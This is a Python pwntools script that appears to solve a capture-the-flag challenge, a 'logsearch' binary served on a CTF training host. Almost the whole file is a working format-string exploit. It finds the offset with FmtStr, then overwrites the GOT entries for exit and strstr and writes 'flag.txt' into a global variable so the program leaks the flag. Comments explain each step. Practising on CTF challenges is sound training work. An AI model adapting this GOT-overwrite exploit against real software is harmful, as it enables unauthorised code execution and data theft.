# run with python3 fmtpwn.py DEBUG to see output
# this binary is an iterative process. first we run the findOffset function to find the offset
# parameter for the call to FmtStr() to do this we run the findOffset() on the remote
from pwn import *
exe = context.binary = ELF('logsearch')
# io = exe.process()
exitaddr = exe.got['exit'] # find the address of exit in the global offset table
fileaddr = exe.symbols['search_file'] # find the address of global variable in binary
strstraddr = exe.got['strstr'] # find the addresss of strstr in global offset table
io1 = remote("ctf.hackucf.org", 20008)
def findOffset(payload): 
   io1 = remote("ctf.hackucf.org", 20008)
   io1.recvuntil(b'phrase:')
   io1.sendline(payload)
   response = io1.recvline()
   return response
 
fmt = FmtStr(execute_fmt=findOffset)
#offset = 87
fmt.write(exitaddr, b'\x53\x93\x04\x08') ## make exit point to search_logs
fmt.write(fileaddr, b'flag.txt') # make search_file say flag.txt
fmt.write(strstraddr, b'\xa1\x93\x04\x08') # make strstr point to printf(match found %s, line)
fmt.execute_writes() # apply exploit
